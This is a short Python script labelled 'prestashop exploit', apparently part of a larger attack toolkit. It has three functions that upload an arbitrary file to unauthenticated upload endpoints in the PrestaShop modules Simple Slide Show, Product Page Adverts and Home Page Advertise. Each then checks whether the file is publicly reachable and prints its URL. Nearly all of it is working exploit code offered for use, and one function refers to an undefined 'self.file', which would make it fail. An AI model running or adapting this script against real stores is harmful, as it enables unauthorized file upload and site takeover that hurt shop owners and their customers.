##
## prestashop exploit
##

from core.misc import printf
import requests

def parse(web):
    if 'http' not in web:
        try:
            requests.get('http://' + web)
            return 'http://' + web
        except:
            return  'https://' + web
    else:
        return  web
def sss_ex(web,file):
    url = parse(web)
    printf('[+] Simple Slide Show exploit')
    printf('[+] start uploading files (%s)' % file)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    requests.post(url + "/modules/simpleslideshow/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/simpleslideshow/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
def ppa_ex(web,file):
    url = parse(web)
    printf('[+] Product Page adverts Exploit')
    printf('[+] start uploading files (%s)' % file)
    files = {'userfile':(file, open(file,'rb'),'multipart/form-data')}
    requests.post(url + "/modules/productpageadverts/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/productpageadverts/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')
def hpa_ex(web,file):
    url = parse(web)
    printf('[+] Home Page Advertise Exploit')
    printf('[+] start uploading files (%s)' % file)
    files = {'userfile':(file, open(file,'rb'),'multipart/form-data')}
    requests.post(url + "/modules/homepageadvertise/uploadimage.php",files=files)
    cek = requests.get(url + "/modules/homepageadvertise/slides/" + self.file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')

